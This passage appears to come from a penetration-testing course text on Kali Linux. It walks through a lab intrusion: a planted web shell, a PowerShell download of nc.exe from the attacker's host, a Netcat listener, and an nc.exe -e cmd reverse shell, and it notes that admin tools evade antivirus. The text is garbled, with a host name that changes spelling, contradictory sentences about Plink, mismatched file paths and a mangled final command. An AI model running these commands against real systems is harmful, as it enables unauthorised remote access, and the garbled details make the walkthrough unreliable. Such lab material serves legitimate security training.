# Penetration Testing with Kali Linux

Administrators may avoid leaving OpenSSH on their machines, even if we find ourselves on a recent version of Windows, network administrators have removed it. Nevertheless, network administrators still need administration tools. Most networks have SSH servers running somewhere, and administrators need to connect to these servers from Windows hosts. Before OpenSSH was so readily available on Windows, most network administrators tools of choice were PuTTY and its command-line counterpart, Plink.

One of the benefits of using tools that are popular with network administrators is that they will rarely flagged by traditional antivirus software. This makes them more appealing to attackers, since using them is relatively covert compared to security-adjacent tools with similar functionality. We'll use Plink in this security assessment, we will more likely have a shell than GUI access. The Plink manual explains that much of the functionality the OpenSSH client is also built into Plink (although one notable feature Plink doesn't have is dynamic forwarding.)

Windows provide port forwarding features. We're using Plink in this case because it's common, lightweight, and specifically designed to run on the command line.

Let's get comfortable with Plink by using it in a revised scenario. In this scenario, we find that MULTERVER03 has a web application on TCP port 80 exposed. All inbound ports are blocked by a firewall, RDP is no longer available either. The layout is like the following diagram:

![](img/33d6ea891e7464f18ad6426619ced4_601_png)

Figure 254: MULTERVER03 behind a firewall, with only port 80 exposed

We can compromise MULTERVER03 through the web application, drop a web shell on it, and gain a reverse shell using it. We have previously found credentials we could use to connect to the RDP service. This is blocked by the firewall, so we cannot connect directly. The OpenSSH client has also been removed, so we can't create a remote port forward using Plink.

However, we have another option: we can create a remote port forward using Plink.

Let's try this out. First, we will get an interactive reverse shell from MULTERVER03. From our initial exploitation, we uploaded a basic shell at /umbraco/forms.aspx. We can browse to this URL and run whatever commands we want - these will run as the iis apppool/defaultappool user. We can use this shell to download nc.exe to MULTISERVER03, which we will then use to send a reverse shell back to our Kali machine.

MULTISERVER03 is already "pre-compiled" in the lab. At this point, you can browse to /umbraco/forms.aspx on the HTTP server on port 80 on MULTISERVER03. You should see a webpage, which will let you run arbitrary commands on MULTERVER03.

To download nc.exe onto MULTISERVER03, we first need to host it on a server that MULTISERVER03 can access. We can easily configure Apache2 on our Kali machine to do this. Apache is installed by default on Kali, so we just need to start the apache2 service.

```
kali@kali:~ sudo systemctl start apache2
[sudo] password for kali:
```

```
kali@kali:-
```

We can then find nc.exe from our Kali windows-resources/binaries directory and copy it to the Apache web root.

```
kali@kali:-$ find -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
```

```
kali@kali:-$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

Once the executable is set, we should be able to enable it on MULTERVER03. We will use a PowerShell wget liner from our web shell to download nc.exe.

From the shell, we will use a command that will instruct PowerShell to download nc.exe from our Kali machine and write it to C:\Windows\Temp on MULTERVER03 -OutputFile.

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

Once the PowerShell command is executed, our payload is downloaded from our Apache2 server to C:\Windows\nc.exe on MULTERVER03.

We then set up a Netcat listener on port 4446 on our Kali machine.

```
kali@kali:$ nc -nvlp 4446
listening on [any] 4446
```

Once the listener is running, we'll execute nc.exe on MULTERVER03 using the web shell again, -e to execute cmd exe once the connection is established.

```
C:\Windows\Temp\nc.exe - cmd exe 192.168.118.4 4446
```
